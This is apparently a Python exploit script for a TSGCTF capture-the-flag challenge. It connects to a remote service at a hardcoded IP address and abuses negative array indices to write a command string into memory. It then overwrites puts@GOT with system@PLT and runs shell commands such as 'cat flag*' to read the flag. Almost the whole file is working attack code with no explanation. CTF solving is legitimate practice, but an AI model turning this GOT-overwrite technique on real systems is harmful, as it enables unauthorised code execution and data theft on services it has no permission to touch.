#!/usr/bin/env python3
"""
New approach: Use command that outputs IMMEDIATELY without needing stdin
Try: ls, pwd, whoami - commands that just print and exit
"""
import socket
import time
import struct

def test_command(cmd_str):
    print(f"\n{'='*60}")
    print(f"Testing command: {cmd_str}")
    print('='*60)
    
    # Pad to multiple of 4 bytes
    cmd_bytes = cmd_str.encode() + b'\x00'
    while len(cmd_bytes) % 4 != 0:
        cmd_bytes += b'\x00'
    
    # Convert to ints
    cmd_ints = [struct.unpack('<I', cmd_bytes[i:i+4])[0] 
                for i in range(0, len(cmd_bytes), 4)]
    
    print(f"Command bytes: {cmd_bytes.hex()}")
    print(f"Command ints: {cmd_ints}")
    
    s = socket.socket()
    s.settimeout(15)
    s.connect(('34.84.25.24', 58554))
    
    # Write command to values[0...]
    for idx, val in enumerate(cmd_ints):
        s.recv(4096)
        s.sendall(f"{idx}\n".encode())
        time.sleep(0.05)
        s.recv(4096)
        s.sendall(f"{val}\n".encode())
        time.sleep(0.05)
    
    # Point msg to values[0] (0x6010c0)
    s.recv(4096)
    s.sendall(b"-22\n")
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(b"6295744\n")
    time.sleep(0.05)
    
    s.recv(4096)
    s.sendall(b"-21\n")
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(b"0\n")
    time.sleep(0.05)
    
    # Overwrite puts@GOT with system@PLT (0x4006c0)
    s.recv(4096)
    s.sendall(b"-40\n")
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(b"4196032\n")
    time.sleep(0.05)
    
    s.recv(4096)
    s.sendall(b"-39\n")
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(b"0\n")
    time.sleep(0.05)
    
    # Exit to trigger
    s.recv(4096)
    s.sendall(b"-1\n")
    time.sleep(2)  # Wait longer for command execution
    
    # Read all output
    output = b''
    s.settimeout(5)
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            output += chunk
            time.sleep(0.1)
    except:
        pass
    
    print(f"\nOutput ({len(output)} bytes):")
    print(output.decode(errors='ignore'))
    
    if b'TSGCTF{' in output:
        print("\n[+] FLAG FOUND!")
        start = output.find(b'TSGCTF{')
        end = output.find(b'}', start) + 1
        print(f"\n{'='*60}")
        print(f"FLAG: {output[start:end].decode()}")
        print('='*60)
        return True
    
    s.close()
    return False

# Test various commands that output immediately
commands = [
    "cat flag*",
    "cat /home/user/flag*",
    "ls -la",
    "pwd",
    "cat *flag*",
    "/bin/cat flag*",
    "find . -name '*flag*' -exec cat {} \\;",
]

for cmd in commands:
    if test_command(cmd):
        break
    time.sleep(1)

print("\n[*] All attempts completed")
